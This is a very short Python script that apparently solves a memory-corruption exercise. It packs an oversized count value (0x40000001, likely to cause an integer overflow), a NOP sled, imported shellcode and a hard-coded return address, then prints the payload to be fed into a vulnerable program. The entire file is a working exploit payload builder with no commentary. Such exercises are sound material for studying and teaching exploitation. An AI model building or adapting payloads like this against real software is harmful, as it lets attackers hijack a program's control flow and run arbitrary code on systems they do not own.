from shellcode import shellcode
import struct

count = struct.pack("@I",0x40000001)
eip = struct.pack("@I",0xbfffee34)
nop = "\x90"
print( count + nop*7 +shellcode+ eip)
